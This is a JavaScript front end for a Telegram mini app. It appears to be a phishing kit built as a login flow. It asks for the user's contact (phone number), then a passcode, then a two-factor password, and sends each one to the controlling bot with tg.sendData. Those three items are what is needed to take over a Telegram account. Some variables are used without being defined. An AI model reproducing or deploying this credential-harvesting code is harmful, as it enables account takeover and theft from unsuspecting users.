document.addEventListener('DOMContentLoaded', () => {
    const tg = window.Telegram.WebApp;

    const loginBtn = document.getElementById('loginbtn');
    const page1 = document.getElementById('page1');
    const page2 = document.getElementById('page2');
    const blur = document.getElementById('blur');
    const passcodeBtn = document.getElementById('passcode-btn');
    const passcodeInput = document.getElementById('passcode-input');
    const twofactorInput = document.getElementById('twofactor-input');

    loginBtn.addEventListener('click', async () => {
        try {
            const contact = tg.requestContact();

            tg.onEvent('contactRequested', (data) => {
                if (data.status === 'sent') {
                    tg.sendData(contact);
                    showPage2();
                }
            });
        } catch (error) {
            console.log('[ERROR]: ' + error);
        }
    });

    function showPage2() {
        console.log('SHOWED');
        page2.style.display = 'flex';
        requestAnimationFrame(() => {
            page2.style.transform = 'translateY(0)';
        });
        page2.style.zIndex = '100';
        blur.style.opacity = '1';
        loginbtn.style.display = 'none';
    }

    passcodeBtn.addEventListener('click', () => {
        const value = passcodeInput.value;

        tg.sendData(JSON.stringify({ action: 'passcode_value', value: value }));
        page2.style.transform = 'translate(-50%, 40px)';
        page2.style.opacity = '0';

        setTimeout(() => {
            page2.style.display = 'none';

            page3.style.display = 'flex';
            requestAnimationFrame(() => {
                page3.style.transform = 'translate(0)';
                page3.style.opacity = '1';
            });
        }, 200);
    });

    const twofactorBtn = document.getElementById('twofactor-btn');
    twofactorBtn.addEventListener('click', () => {
        const value = twofactorInput.value;
        tg.sendData(
            JSON.stringify({ action: 'twofactor_value', value: value })
        );
    });
});
